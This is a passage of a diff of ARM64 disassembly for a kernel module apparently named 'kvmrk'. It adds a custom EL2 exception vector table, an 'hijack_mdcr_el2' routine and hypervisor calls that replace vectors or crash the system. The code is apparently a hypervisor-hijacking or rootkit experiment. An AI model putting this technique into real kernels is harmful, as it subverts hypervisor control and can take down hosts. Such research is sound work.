+     58c:	d503201f 	nop
+     590:	d503201f 	nop
+     594:	d503201f 	nop
+     598:	d503201f 	nop
+     59c:	d503201f 	nop
+     5a0:	d503201f 	nop
+     5a4:	d503201f 	nop
+     5a8:	d503201f 	nop
+     5ac:	d503201f 	nop
+     5b0:	d503201f 	nop
+     5b4:	d503201f 	nop
+     5b8:	d503201f 	nop
+     5bc:	d503201f 	nop
+     5c0:	d503201f 	nop
+     5c4:	d503201f 	nop
+     5c8:	d503201f 	nop
+     5cc:	d503201f 	nop
+     5d0:	d503201f 	nop
+     5d4:	d503201f 	nop
+     5d8:	d503201f 	nop
+     5dc:	d503201f 	nop
+     5e0:	d503201f 	nop
+     5e4:	d503201f 	nop
+     5e8:	d503201f 	nop
+     5ec:	d503201f 	nop
+     5f0:	d503201f 	nop
+     5f4:	d503201f 	nop
+     5f8:	d503201f 	nop
+     5fc:	d503201f 	nop
+     600:	d503201f 	nop
+     604:	d503201f 	nop
+     608:	d503201f 	nop
+     60c:	d503201f 	nop
+     610:	d503201f 	nop
+     614:	d503201f 	nop
+     618:	d503201f 	nop
+     61c:	d503201f 	nop
+     620:	d503201f 	nop
+     624:	d503201f 	nop
+     628:	d503201f 	nop
+     62c:	d503201f 	nop
+     630:	d503201f 	nop
+     634:	d503201f 	nop
+     638:	d503201f 	nop
+     63c:	d503201f 	nop
+     640:	d503201f 	nop
+     644:	d503201f 	nop
+     648:	d503201f 	nop
+     64c:	d503201f 	nop
+     650:	d503201f 	nop
+     654:	d503201f 	nop
+     658:	d503201f 	nop
+     65c:	d503201f 	nop
+     660:	d503201f 	nop
+     664:	d503201f 	nop
+     668:	d503201f 	nop
+     66c:	d503201f 	nop
+     670:	d503201f 	nop
+     674:	d503201f 	nop
+     678:	d503201f 	nop
+     67c:	d503201f 	nop
+     680:	d503201f 	nop
+     684:	d503201f 	nop
+     688:	d503201f 	nop
+     68c:	d503201f 	nop
+     690:	d503201f 	nop
+     694:	d503201f 	nop
+     698:	d503201f 	nop
+     69c:	d503201f 	nop
+     6a0:	d503201f 	nop
+     6a4:	d503201f 	nop
+     6a8:	d503201f 	nop
+     6ac:	d503201f 	nop
+     6b0:	d503201f 	nop
+     6b4:	d503201f 	nop
+     6b8:	d503201f 	nop
+     6bc:	d503201f 	nop
+     6c0:	d503201f 	nop
+     6c4:	d503201f 	nop
+     6c8:	d503201f 	nop
+     6cc:	d503201f 	nop
+     6d0:	d503201f 	nop
+     6d4:	d503201f 	nop
+     6d8:	d503201f 	nop
+     6dc:	d503201f 	nop
+     6e0:	d503201f 	nop
+     6e4:	d503201f 	nop
+     6e8:	d503201f 	nop
+     6ec:	d503201f 	nop
+     6f0:	d503201f 	nop
+     6f4:	d503201f 	nop
+     6f8:	d503201f 	nop
+     6fc:	d503201f 	nop
+     700:	d503201f 	nop
+     704:	d503201f 	nop
+     708:	d503201f 	nop
+     70c:	d503201f 	nop
+     710:	d503201f 	nop
+     714:	d503201f 	nop
+     718:	d503201f 	nop
+     71c:	d503201f 	nop
+     720:	d503201f 	nop
+     724:	d503201f 	nop
+     728:	d503201f 	nop
+     72c:	d503201f 	nop
+     730:	d503201f 	nop
+     734:	d503201f 	nop
+     738:	d503201f 	nop
+     73c:	d503201f 	nop
+     740:	d503201f 	nop
+     744:	d503201f 	nop
+     748:	d503201f 	nop
+     74c:	d503201f 	nop
+     750:	d503201f 	nop
+     754:	d503201f 	nop
+     758:	d503201f 	nop
+     75c:	d503201f 	nop
+     760:	d503201f 	nop
+     764:	d503201f 	nop
+     768:	d503201f 	nop
+     76c:	d503201f 	nop
+     770:	d503201f 	nop
+     774:	d503201f 	nop
+     778:	d503201f 	nop
+     77c:	d503201f 	nop
+     780:	d503201f 	nop
+     784:	d503201f 	nop
+     788:	d503201f 	nop
+     78c:	d503201f 	nop
+     790:	d503201f 	nop
+     794:	d503201f 	nop
+     798:	d503201f 	nop
+     79c:	d503201f 	nop
+     7a0:	d503201f 	nop
+     7a4:	d503201f 	nop
+     7a8:	d503201f 	nop
+     7ac:	d503201f 	nop
+     7b0:	d503201f 	nop
+     7b4:	d503201f 	nop
+     7b8:	d503201f 	nop
+     7bc:	d503201f 	nop
+     7c0:	d503201f 	nop
+     7c4:	d503201f 	nop
+     7c8:	d503201f 	nop
+     7cc:	d503201f 	nop
+     7d0:	d503201f 	nop
+     7d4:	d503201f 	nop
+     7d8:	d503201f 	nop
+     7dc:	d503201f 	nop
+     7e0:	d503201f 	nop
+     7e4:	d503201f 	nop
+     7e8:	d503201f 	nop
+     7ec:	d503201f 	nop
+     7f0:	d503201f 	nop
+     7f4:	d503201f 	nop
+     7f8:	d503201f 	nop
+     7fc:	d503201f 	nop
 
-000000000000080c <el2_irq_invalid>:
- 80c:	14000000 	b	80c <el2_irq_invalid>
+0000000000000800 <kvmrk_vectors>:
+     800:	14000205 	b	1014 <el2_sync_invalid>
+     804:	d503201f 	nop
+     808:	d503201f 	nop
+     80c:	d503201f 	nop
+     810:	d503201f 	nop
+     814:	d503201f 	nop
+     818:	d503201f 	nop
+     81c:	d503201f 	nop
+     820:	d503201f 	nop
+     824:	d503201f 	nop
+     828:	d503201f 	nop
+     82c:	d503201f 	nop
+     830:	d503201f 	nop
+     834:	d503201f 	nop
+     838:	d503201f 	nop
+     83c:	d503201f 	nop
+     840:	d503201f 	nop
+     844:	d503201f 	nop
+     848:	d503201f 	nop
+     84c:	d503201f 	nop
+     850:	d503201f 	nop
+     854:	d503201f 	nop
+     858:	d503201f 	nop
+     85c:	d503201f 	nop
+     860:	d503201f 	nop
+     864:	d503201f 	nop
+     868:	d503201f 	nop
+     86c:	d503201f 	nop
+     870:	d503201f 	nop
+     874:	d503201f 	nop
+     878:	d503201f 	nop
+     87c:	d503201f 	nop
+     880:	140001e6 	b	1018 <el2_irq_invalid>
+     884:	d503201f 	nop
+     888:	d503201f 	nop
+     88c:	d503201f 	nop
+     890:	d503201f 	nop
+     894:	d503201f 	nop
+     898:	d503201f 	nop
+     89c:	d503201f 	nop
+     8a0:	d503201f 	nop
+     8a4:	d503201f 	nop
+     8a8:	d503201f 	nop
+     8ac:	d503201f 	nop
+     8b0:	d503201f 	nop
+     8b4:	d503201f 	nop
+     8b8:	d503201f 	nop
+     8bc:	d503201f 	nop
+     8c0:	d503201f 	nop
+     8c4:	d503201f 	nop
+     8c8:	d503201f 	nop
+     8cc:	d503201f 	nop
+     8d0:	d503201f 	nop
+     8d4:	d503201f 	nop
+     8d8:	d503201f 	nop
+     8dc:	d503201f 	nop
+     8e0:	d503201f 	nop
+     8e4:	d503201f 	nop
+     8e8:	d503201f 	nop
+     8ec:	d503201f 	nop
+     8f0:	d503201f 	nop
+     8f4:	d503201f 	nop
+     8f8:	d503201f 	nop
+     8fc:	d503201f 	nop
+     900:	140001c7 	b	101c <el2_fiq_invalid>
+     904:	d503201f 	nop
+     908:	d503201f 	nop
+     90c:	d503201f 	nop
+     910:	d503201f 	nop
+     914:	d503201f 	nop
+     918:	d503201f 	nop
+     91c:	d503201f 	nop
+     920:	d503201f 	nop
+     924:	d503201f 	nop
+     928:	d503201f 	nop
+     92c:	d503201f 	nop
+     930:	d503201f 	nop
+     934:	d503201f 	nop
+     938:	d503201f 	nop
+     93c:	d503201f 	nop
+     940:	d503201f 	nop
+     944:	d503201f 	nop
+     948:	d503201f 	nop
+     94c:	d503201f 	nop
+     950:	d503201f 	nop
+     954:	d503201f 	nop
+     958:	d503201f 	nop
+     95c:	d503201f 	nop
+     960:	d503201f 	nop
+     964:	d503201f 	nop
+     968:	d503201f 	nop
+     96c:	d503201f 	nop
+     970:	d503201f 	nop
+     974:	d503201f 	nop
+     978:	d503201f 	nop
+     97c:	d503201f 	nop
+     980:	140001a8 	b	1020 <el2_error_invalid>
+     984:	d503201f 	nop
+     988:	d503201f 	nop
+     98c:	d503201f 	nop
+     990:	d503201f 	nop
+     994:	d503201f 	nop
+     998:	d503201f 	nop
+     99c:	d503201f 	nop
+     9a0:	d503201f 	nop
+     9a4:	d503201f 	nop
+     9a8:	d503201f 	nop
+     9ac:	d503201f 	nop
+     9b0:	d503201f 	nop
+     9b4:	d503201f 	nop
+     9b8:	d503201f 	nop
+     9bc:	d503201f 	nop
+     9c0:	d503201f 	nop
+     9c4:	d503201f 	nop
+     9c8:	d503201f 	nop
+     9cc:	d503201f 	nop
+     9d0:	d503201f 	nop
+     9d4:	d503201f 	nop
+     9d8:	d503201f 	nop
+     9dc:	d503201f 	nop
+     9e0:	d503201f 	nop
+     9e4:	d503201f 	nop
+     9e8:	d503201f 	nop
+     9ec:	d503201f 	nop
+     9f0:	d503201f 	nop
+     9f4:	d503201f 	nop
+     9f8:	d503201f 	nop
+     9fc:	d503201f 	nop
+     a00:	14000180 	b	1000 <handle_trap_el1>
+     a04:	d503201f 	nop
+     a08:	d503201f 	nop
+     a0c:	d503201f 	nop
+     a10:	d503201f 	nop
+     a14:	d503201f 	nop
+     a18:	d503201f 	nop
+     a1c:	d503201f 	nop
+     a20:	d503201f 	nop
+     a24:	d503201f 	nop
+     a28:	d503201f 	nop
+     a2c:	d503201f 	nop
+     a30:	d503201f 	nop
+     a34:	d503201f 	nop
+     a38:	d503201f 	nop
+     a3c:	d503201f 	nop
+     a40:	d503201f 	nop
+     a44:	d503201f 	nop
+     a48:	d503201f 	nop
+     a4c:	d503201f 	nop
+     a50:	d503201f 	nop
+     a54:	d503201f 	nop
+     a58:	d503201f 	nop
+     a5c:	d503201f 	nop
+     a60:	d503201f 	nop
+     a64:	d503201f 	nop
+     a68:	d503201f 	nop
+     a6c:	d503201f 	nop
+     a70:	d503201f 	nop
+     a74:	d503201f 	nop
+     a78:	d503201f 	nop
+     a7c:	d503201f 	nop
+     a80:	14000166 	b	1018 <el2_irq_invalid>
+     a84:	d503201f 	nop
+     a88:	d503201f 	nop
+     a8c:	d503201f 	nop
+     a90:	d503201f 	nop
+     a94:	d503201f 	nop
+     a98:	d503201f 	nop
+     a9c:	d503201f 	nop
+     aa0:	d503201f 	nop
+     aa4:	d503201f 	nop
+     aa8:	d503201f 	nop
+     aac:	d503201f 	nop
+     ab0:	d503201f 	nop
+     ab4:	d503201f 	nop
+     ab8:	d503201f 	nop
+     abc:	d503201f 	nop
+     ac0:	d503201f 	nop
+     ac4:	d503201f 	nop
+     ac8:	d503201f 	nop
+     acc:	d503201f 	nop
+     ad0:	d503201f 	nop
+     ad4:	d503201f 	nop
+     ad8:	d503201f 	nop
+     adc:	d503201f 	nop
+     ae0:	d503201f 	nop
+     ae4:	d503201f 	nop
+     ae8:	d503201f 	nop
+     aec:	d503201f 	nop
+     af0:	d503201f 	nop
+     af4:	d503201f 	nop
+     af8:	d503201f 	nop
+     afc:	d503201f 	nop
+     b00:	14000147 	b	101c <el2_fiq_invalid>
+     b04:	d503201f 	nop
+     b08:	d503201f 	nop
+     b0c:	d503201f 	nop
+     b10:	d503201f 	nop
+     b14:	d503201f 	nop
+     b18:	d503201f 	nop
+     b1c:	d503201f 	nop
+     b20:	d503201f 	nop
+     b24:	d503201f 	nop
+     b28:	d503201f 	nop
+     b2c:	d503201f 	nop
+     b30:	d503201f 	nop
+     b34:	d503201f 	nop
+     b38:	d503201f 	nop
+     b3c:	d503201f 	nop
+     b40:	d503201f 	nop
+     b44:	d503201f 	nop
+     b48:	d503201f 	nop
+     b4c:	d503201f 	nop
+     b50:	d503201f 	nop
+     b54:	d503201f 	nop
+     b58:	d503201f 	nop
+     b5c:	d503201f 	nop
+     b60:	d503201f 	nop
+     b64:	d503201f 	nop
+     b68:	d503201f 	nop
+     b6c:	d503201f 	nop
+     b70:	d503201f 	nop
+     b74:	d503201f 	nop
+     b78:	d503201f 	nop
+     b7c:	d503201f 	nop
+     b80:	14000128 	b	1020 <el2_error_invalid>
+     b84:	d503201f 	nop
+     b88:	d503201f 	nop
+     b8c:	d503201f 	nop
+     b90:	d503201f 	nop
+     b94:	d503201f 	nop
+     b98:	d503201f 	nop
+     b9c:	d503201f 	nop
+     ba0:	d503201f 	nop
+     ba4:	d503201f 	nop
+     ba8:	d503201f 	nop
+     bac:	d503201f 	nop
+     bb0:	d503201f 	nop
+     bb4:	d503201f 	nop
+     bb8:	d503201f 	nop
+     bbc:	d503201f 	nop
+     bc0:	d503201f 	nop
+     bc4:	d503201f 	nop
+     bc8:	d503201f 	nop
+     bcc:	d503201f 	nop
+     bd0:	d503201f 	nop
+     bd4:	d503201f 	nop
+     bd8:	d503201f 	nop
+     bdc:	d503201f 	nop
+     be0:	d503201f 	nop
+     be4:	d503201f 	nop
+     be8:	d503201f 	nop
+     bec:	d503201f 	nop
+     bf0:	d503201f 	nop
+     bf4:	d503201f 	nop
+     bf8:	d503201f 	nop
+     bfc:	d503201f 	nop
+     c00:	14000100 	b	1000 <handle_trap_el1>
+     c04:	d503201f 	nop
+     c08:	d503201f 	nop
+     c0c:	d503201f 	nop
+     c10:	d503201f 	nop
+     c14:	d503201f 	nop
+     c18:	d503201f 	nop
+     c1c:	d503201f 	nop
+     c20:	d503201f 	nop
+     c24:	d503201f 	nop
+     c28:	d503201f 	nop
+     c2c:	d503201f 	nop
+     c30:	d503201f 	nop
+     c34:	d503201f 	nop
+     c38:	d503201f 	nop
+     c3c:	d503201f 	nop
+     c40:	d503201f 	nop
+     c44:	d503201f 	nop
+     c48:	d503201f 	nop
+     c4c:	d503201f 	nop
+     c50:	d503201f 	nop
+     c54:	d503201f 	nop
+     c58:	d503201f 	nop
+     c5c:	d503201f 	nop
+     c60:	d503201f 	nop
+     c64:	d503201f 	nop
+     c68:	d503201f 	nop
+     c6c:	d503201f 	nop
+     c70:	d503201f 	nop
+     c74:	d503201f 	nop
+     c78:	d503201f 	nop
+     c7c:	d503201f 	nop
+     c80:	140000ea 	b	1028 <el1_irq_invalid>
+     c84:	d503201f 	nop
+     c88:	d503201f 	nop
+     c8c:	d503201f 	nop
+     c90:	d503201f 	nop
+     c94:	d503201f 	nop
+     c98:	d503201f 	nop
+     c9c:	d503201f 	nop
+     ca0:	d503201f 	nop
+     ca4:	d503201f 	nop
+     ca8:	d503201f 	nop
+     cac:	d503201f 	nop
+     cb0:	d503201f 	nop
+     cb4:	d503201f 	nop
+     cb8:	d503201f 	nop
+     cbc:	d503201f 	nop
+     cc0:	d503201f 	nop
+     cc4:	d503201f 	nop
+     cc8:	d503201f 	nop
+     ccc:	d503201f 	nop
+     cd0:	d503201f 	nop
+     cd4:	d503201f 	nop
+     cd8:	d503201f 	nop
+     cdc:	d503201f 	nop
+     ce0:	d503201f 	nop
+     ce4:	d503201f 	nop
+     ce8:	d503201f 	nop
+     cec:	d503201f 	nop
+     cf0:	d503201f 	nop
+     cf4:	d503201f 	nop
+     cf8:	d503201f 	nop
+     cfc:	d503201f 	nop
+     d00:	140000cb 	b	102c <el1_fiq_invalid>
+     d04:	d503201f 	nop
+     d08:	d503201f 	nop
+     d0c:	d503201f 	nop
+     d10:	d503201f 	nop
+     d14:	d503201f 	nop
+     d18:	d503201f 	nop
+     d1c:	d503201f 	nop
+     d20:	d503201f 	nop
+     d24:	d503201f 	nop
+     d28:	d503201f 	nop
+     d2c:	d503201f 	nop
+     d30:	d503201f 	nop
+     d34:	d503201f 	nop
+     d38:	d503201f 	nop
+     d3c:	d503201f 	nop
+     d40:	d503201f 	nop
+     d44:	d503201f 	nop
+     d48:	d503201f 	nop
+     d4c:	d503201f 	nop
+     d50:	d503201f 	nop
+     d54:	d503201f 	nop
+     d58:	d503201f 	nop
+     d5c:	d503201f 	nop
+     d60:	d503201f 	nop
+     d64:	d503201f 	nop
+     d68:	d503201f 	nop
+     d6c:	d503201f 	nop
+     d70:	d503201f 	nop
+     d74:	d503201f 	nop
+     d78:	d503201f 	nop
+     d7c:	d503201f 	nop
+     d80:	140000ac 	b	1030 <el1_error_invalid>
+     d84:	d503201f 	nop
+     d88:	d503201f 	nop
+     d8c:	d503201f 	nop
+     d90:	d503201f 	nop
+     d94:	d503201f 	nop
+     d98:	d503201f 	nop
+     d9c:	d503201f 	nop
+     da0:	d503201f 	nop
+     da4:	d503201f 	nop
+     da8:	d503201f 	nop
+     dac:	d503201f 	nop
+     db0:	d503201f 	nop
+     db4:	d503201f 	nop
+     db8:	d503201f 	nop
+     dbc:	d503201f 	nop
+     dc0:	d503201f 	nop
+     dc4:	d503201f 	nop
+     dc8:	d503201f 	nop
+     dcc:	d503201f 	nop
+     dd0:	d503201f 	nop
+     dd4:	d503201f 	nop
+     dd8:	d503201f 	nop
+     ddc:	d503201f 	nop
+     de0:	d503201f 	nop
+     de4:	d503201f 	nop
+     de8:	d503201f 	nop
+     dec:	d503201f 	nop
+     df0:	d503201f 	nop
+     df4:	d503201f 	nop
+     df8:	d503201f 	nop
+     dfc:	d503201f 	nop
+     e00:	14000089 	b	1024 <el1_sync_invalid>
+     e04:	d503201f 	nop
+     e08:	d503201f 	nop
+     e0c:	d503201f 	nop
+     e10:	d503201f 	nop
+     e14:	d503201f 	nop
+     e18:	d503201f 	nop
+     e1c:	d503201f 	nop
+     e20:	d503201f 	nop
+     e24:	d503201f 	nop
+     e28:	d503201f 	nop
+     e2c:	d503201f 	nop
+     e30:	d503201f 	nop
+     e34:	d503201f 	nop
+     e38:	d503201f 	nop
+     e3c:	d503201f 	nop
+     e40:	d503201f 	nop
+     e44:	d503201f 	nop
+     e48:	d503201f 	nop
+     e4c:	d503201f 	nop
+     e50:	d503201f 	nop
+     e54:	d503201f 	nop
+     e58:	d503201f 	nop
+     e5c:	d503201f 	nop
+     e60:	d503201f 	nop
+     e64:	d503201f 	nop
+     e68:	d503201f 	nop
+     e6c:	d503201f 	nop
+     e70:	d503201f 	nop
+     e74:	d503201f 	nop
+     e78:	d503201f 	nop
+     e7c:	d503201f 	nop
+     e80:	1400006a 	b	1028 <el1_irq_invalid>
+     e84:	d503201f 	nop
+     e88:	d503201f 	nop
+     e8c:	d503201f 	nop
+     e90:	d503201f 	nop
+     e94:	d503201f 	nop
+     e98:	d503201f 	nop
+     e9c:	d503201f 	nop
+     ea0:	d503201f 	nop
+     ea4:	d503201f 	nop
+     ea8:	d503201f 	nop
+     eac:	d503201f 	nop
+     eb0:	d503201f 	nop
+     eb4:	d503201f 	nop
+     eb8:	d503201f 	nop
+     ebc:	d503201f 	nop
+     ec0:	d503201f 	nop
+     ec4:	d503201f 	nop
+     ec8:	d503201f 	nop
+     ecc:	d503201f 	nop
+     ed0:	d503201f 	nop
+     ed4:	d503201f 	nop
+     ed8:	d503201f 	nop
+     edc:	d503201f 	nop
+     ee0:	d503201f 	nop
+     ee4:	d503201f 	nop
+     ee8:	d503201f 	nop
+     eec:	d503201f 	nop
+     ef0:	d503201f 	nop
+     ef4:	d503201f 	nop
+     ef8:	d503201f 	nop
+     efc:	d503201f 	nop
+     f00:	1400004b 	b	102c <el1_fiq_invalid>
+     f04:	d503201f 	nop
+     f08:	d503201f 	nop
+     f0c:	d503201f 	nop
+     f10:	d503201f 	nop
+     f14:	d503201f 	nop
+     f18:	d503201f 	nop
+     f1c:	d503201f 	nop
+     f20:	d503201f 	nop
+     f24:	d503201f 	nop
+     f28:	d503201f 	nop
+     f2c:	d503201f 	nop
+     f30:	d503201f 	nop
+     f34:	d503201f 	nop
+     f38:	d503201f 	nop
+     f3c:	d503201f 	nop
+     f40:	d503201f 	nop
+     f44:	d503201f 	nop
+     f48:	d503201f 	nop
+     f4c:	d503201f 	nop
+     f50:	d503201f 	nop
+     f54:	d503201f 	nop
+     f58:	d503201f 	nop
+     f5c:	d503201f 	nop
+     f60:	d503201f 	nop
+     f64:	d503201f 	nop
+     f68:	d503201f 	nop
+     f6c:	d503201f 	nop
+     f70:	d503201f 	nop
+     f74:	d503201f 	nop
+     f78:	d503201f 	nop
+     f7c:	d503201f 	nop
+     f80:	1400002c 	b	1030 <el1_error_invalid>
+     f84:	d503201f 	nop
+     f88:	d503201f 	nop
+     f8c:	d503201f 	nop
+     f90:	d503201f 	nop
+     f94:	d503201f 	nop
+     f98:	d503201f 	nop
+     f9c:	d503201f 	nop
+     fa0:	d503201f 	nop
+     fa4:	d503201f 	nop
+     fa8:	d503201f 	nop
+     fac:	d503201f 	nop
+     fb0:	d503201f 	nop
+     fb4:	d503201f 	nop
+     fb8:	d503201f 	nop
+     fbc:	d503201f 	nop
+     fc0:	d503201f 	nop
+     fc4:	d503201f 	nop
+     fc8:	d503201f 	nop
+     fcc:	d503201f 	nop
+     fd0:	d503201f 	nop
+     fd4:	d503201f 	nop
+     fd8:	d503201f 	nop
+     fdc:	d503201f 	nop
+     fe0:	d503201f 	nop
+     fe4:	d503201f 	nop
+     fe8:	d503201f 	nop
+     fec:	d503201f 	nop
+     ff0:	d503201f 	nop
+     ff4:	d503201f 	nop
+     ff8:	d503201f 	nop
+     ffc:	d503201f 	nop
 
-0000000000000810 <el2_fiq_invalid>:
- 810:	14000000 	b	810 <el2_fiq_invalid>
+0000000000001000 <handle_trap_el1>:
+    1000:	d69f03e0 	eret
 
-0000000000000814 <el2_error_invalid>:
- 814:	14000000 	b	814 <el2_error_invalid>
+0000000000001004 <hijack_mdcr_el2>:
+    1004:	d53c1120 	mrs	x0, mdcr_el2
+    1008:	b2770000 	orr	x0, x0, #0x200
+    100c:	d51c1120 	msr	mdcr_el2, x0
+    1010:	d69f03e0 	eret
 
-0000000000000818 <el1_sync_invalid>:
- 818:	14000000 	b	818 <el1_sync_invalid>
+0000000000001014 <el2_sync_invalid>:
+    1014:	14000000 	b	1014 <el2_sync_invalid>
 
-000000000000081c <el1_irq_invalid>:
- 81c:	14000000 	b	81c <el1_irq_invalid>
+0000000000001018 <el2_irq_invalid>:
+    1018:	14000000 	b	1018 <el2_irq_invalid>
 
-0000000000000820 <el1_fiq_invalid>:
- 820:	14000000 	b	820 <el1_fiq_invalid>
+000000000000101c <el2_fiq_invalid>:
+    101c:	14000000 	b	101c <el2_fiq_invalid>
 
-0000000000000824 <el1_error_invalid>:
- 824:	14000000 	b	824 <el1_error_invalid>
+0000000000001020 <el2_error_invalid>:
+    1020:	14000000 	b	1020 <el2_error_invalid>
 
-0000000000000828 <kvmrk_replace_vbar_el2>:
- 828:	8b0003ea 	add	x10, xzr, x0
- 82c:	d2800040 	mov	x0, #0x2                   	// #2
- 830:	d4000002 	hvc	#0x0
- 834:	d2800000 	mov	x0, #0x0                   	// #0
- 838:	8b0a03e1 	add	x1, xzr, x10
- 83c:	d4000002 	hvc	#0x0
- 840:	d65f03c0 	ret
+0000000000001024 <el1_sync_invalid>:
+    1024:	14000000 	b	1024 <el1_sync_invalid>
 
-0000000000000844 <kvmrk_call_hyp>:
- 844:	8b0003e1 	add	x1, xzr, x0
- 848:	d2800160 	mov	x0, #0xb                   	// #11
- 84c:	d4000002 	hvc	#0x0
- 850:	d65f03c0 	ret
+0000000000001028 <el1_irq_invalid>:
+    1028:	14000000 	b	1028 <el1_irq_invalid>
 
-0000000000000854 <kvmrk_crash_everything>:
- 854:	d28001a0 	mov	x0, #0xd                   	// #13
- 858:	d4000002 	hvc	#0x0
- 85c:	d65f03c0 	ret
+000000000000102c <el1_fiq_invalid>:
+    102c:	14000000 	b	102c <el1_fiq_invalid>
+
+0000000000001030 <el1_error_invalid>:
+    1030:	14000000 	b	1030 <el1_error_invalid>
+
+0000000000001034 <kvmrk_set_vectors>:
+    1034:	aa0003e1 	mov	x1, x0
+    1038:	d2800000 	mov	x0, #0x0                   	// #0
+    103c:	d4000002 	hvc	#0x0
+    1040:	d65f03c0 	ret
+
+0000000000001044 <kvmrk_reset_vectors>:
+    1044:	d2800040 	mov	x0, #0x2                   	// #2
+    1048:	d4000002 	hvc	#0x0
+    104c:	d65f03c0 	ret
+
+0000000000001050 <kvmrk_call_hyp>:
+    1050:	8b0003e1 	add	x1, xzr, x0
+    1054:	d2800160 	mov	x0, #0xb                   	// #11
+    1058:	d4000002 	hvc	#0x0
+    105c:	d65f03c0 	ret
+
+0000000000001060 <kvmrk_crash_everything>:
+    1060:	d28001a0 	mov	x0, #0xd                   	// #13
+    1064:	d4000002 	hvc	#0x0
+    1068:	d65f03c0 	ret
+
+Disassembly of section .text.unlikely:
+
+0000000000000000 <__kern_my_cpu_offset>:
+   0:	d503233f 	paciasp
+   4:	d50323bf 	autiasp
+   8:	d538d080 	mrs	x0, tpidr_el1
+   c:	d65f03c0 	ret
+  10:	d53cd040 	mrs	x0, tpidr_el2
 
 Disassembly of section .init.text:
 
@@ -574,51 +1108,123 @@ Disassembly of section .init.text:
    0:	d503201f 	nop
    4:	d503201f 	nop
    8:	d503233f 	paciasp
-   c:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+   c:	a9bc7bfd 	stp	x29, x30, [sp, #-64]!
   10:	90000000 	adrp	x0, 0 <init_module>
   14:	910003fd 	mov	x29, sp
-  18:	91000000 	add	x0, x0, #0x0
-  1c:	94000000 	bl	0 <_printk>
-  20:	90000000 	adrp	x0, 0 <init_module>
-  24:	91000000 	add	x0, x0, #0x0
-  28:	d2e00021 	mov	x1, #0x1000000000000       	// #281474976710656
-  2c:	8b010001 	add	x1, x0, x1
-  30:	b240bbe2 	mov	x2, #0x7fffffffffff        	// #140737488355327
-  34:	eb02003f 	cmp	x1, x2
-  38:	540000a8 	b.hi	4c <init_module+0x4c>  // b.pmore
-  3c:	90000000 	adrp	x0, 0 <memstart_addr>
-  40:	f9400000 	ldr	x0, [x0]
-  44:	8b000020 	add	x0, x1, x0
-  48:	14000004 	b	58 <init_module+0x58>
-  4c:	90000001 	adrp	x1, 0 <kimage_voffset>
-  50:	f9400021 	ldr	x1, [x1]
-  54:	cb010000 	sub	x0, x0, x1
-  58:	94000000 	bl	828 <kvmrk_replace_vbar_el2>
+  18:	a9025bf5 	stp	x21, x22, [sp, #32]
+  1c:	90000015 	adrp	x21, 0 <__num_online_cpus>
+  20:	910002b5 	add	x21, x21, #0x0
+  24:	52800016 	mov	w22, #0x0                   	// #0
+  28:	91000000 	add	x0, x0, #0x0
+  2c:	a90153f3 	stp	x19, x20, [sp, #16]
+  30:	90000014 	adrp	x20, 0 <cpu_number>
+  34:	91000294 	add	x20, x20, #0x0
+  38:	a90363f7 	stp	x23, x24, [sp, #48]
+  3c:	94000000 	bl	0 <_printk>
+  40:	b94002a0 	ldr	w0, [x21]
+  44:	6b16001f 	cmp	w0, w22
+  48:	54000389 	b.ls	b8 <init_module+0xb8>  // b.plast
+  4c:	924016d3 	and	x19, x22, #0x3f
+  50:	91000673 	add	x19, x19, #0x1
+  54:	f101067f 	cmp	x19, #0x41
+  58:	540000a9 	b.ls	6c <init_module+0x6c>  // b.plast
   5c:	90000000 	adrp	x0, 0 <init_module>
-  60:	91000000 	add	x0, x0, #0x0
-  64:	94000000 	bl	0 <_printk>
-  68:	90000000 	adrp	x0, 804 <hijack_mdcr_el2>
-  6c:	91000000 	add	x0, x0, #0x0
-  70:	d2e00021 	mov	x1, #0x1000000000000       	// #281474976710656
-  74:	8b010001 	add	x1, x0, x1
-  78:	b240bbe2 	mov	x2, #0x7fffffffffff        	// #140737488355327
-  7c:	eb02003f 	cmp	x1, x2
-  80:	540000a8 	b.hi	94 <init_module+0x94>  // b.pmore
-  84:	90000000 	adrp	x0, 0 <memstart_addr>
-  88:	f9400000 	ldr	x0, [x0]
-  8c:	8b000020 	add	x0, x1, x0
-  90:	14000004 	b	a0 <init_module+0xa0>
-  94:	90000001 	adrp	x1, 0 <kimage_voffset>
-  98:	f9400021 	ldr	x1, [x1]
-  9c:	cb010000 	sub	x0, x0, x1
-  a0:	94000000 	bl	844 <kvmrk_call_hyp>
+  60:	aa1303e1 	mov	x1, x19
+  64:	91000000 	add	x0, x0, #0x0
+  68:	94000000 	bl	0 <__ubsan_handle_out_of_bounds>
+  6c:	53067ec0 	lsr	w0, w22, #6
+  70:	d37bea73 	lsl	x19, x19, #5
+  74:	90000001 	adrp	x1, 0 <cpu_bit_bitmap>
+  78:	91000021 	add	x1, x1, #0x0
+  7c:	cb204e73 	sub	x19, x19, w0, uxtw #3
+  80:	52800000 	mov	w0, #0x0                   	// #0
+  84:	8b130021 	add	x1, x1, x19
+  88:	94000000 	bl	1a0 <init_module+0x1a0>
+  8c:	110006d6 	add	w22, w22, #0x1
+  90:	94000000 	bl	1044 <kvmrk_reset_vectors>
+  94:	2a0003f3 	mov	w19, w0
+  98:	94000000 	bl	0 <init_module>
+  9c:	aa0003e1 	mov	x1, x0
+  a0:	2a1303e2 	mov	w2, w19
   a4:	90000000 	adrp	x0, 0 <init_module>
   a8:	91000000 	add	x0, x0, #0x0
-  ac:	94000000 	bl	0 <_printk>
-  b0:	52800000 	mov	w0, #0x0                   	// #0
-  b4:	a8c17bfd 	ldp	x29, x30, [sp], #16
-  b8:	d50323bf 	autiasp
-  bc:	d65f03c0 	ret
+  ac:	b8746821 	ldr	w1, [x1, x20]
+  b0:	94000000 	bl	0 <_printk>
+  b4:	17ffffe3 	b	40 <init_module+0x40>
+  b8:	90000016 	adrp	x22, 800 <kvmrk_vectors>
+  bc:	910002d6 	add	x22, x22, #0x0
+  c0:	d2e00034 	mov	x20, #0x1000000000000       	// #281474976710656
+  c4:	8b1402d4 	add	x20, x22, x20
+  c8:	52800018 	mov	w24, #0x0                   	// #0
+  cc:	90000017 	adrp	x23, 0 <init_module>
+  d0:	b94002a0 	ldr	w0, [x21]
+  d4:	6b18001f 	cmp	w0, w24
+  d8:	540004c9 	b.ls	170 <init_module+0x170>  // b.plast
+  dc:	92401713 	and	x19, x24, #0x3f
+  e0:	91000673 	add	x19, x19, #0x1
+  e4:	f101067f 	cmp	x19, #0x41
+  e8:	540000a9 	b.ls	fc <init_module+0xfc>  // b.plast
+  ec:	910002e0 	add	x0, x23, #0x0
+  f0:	aa1303e1 	mov	x1, x19
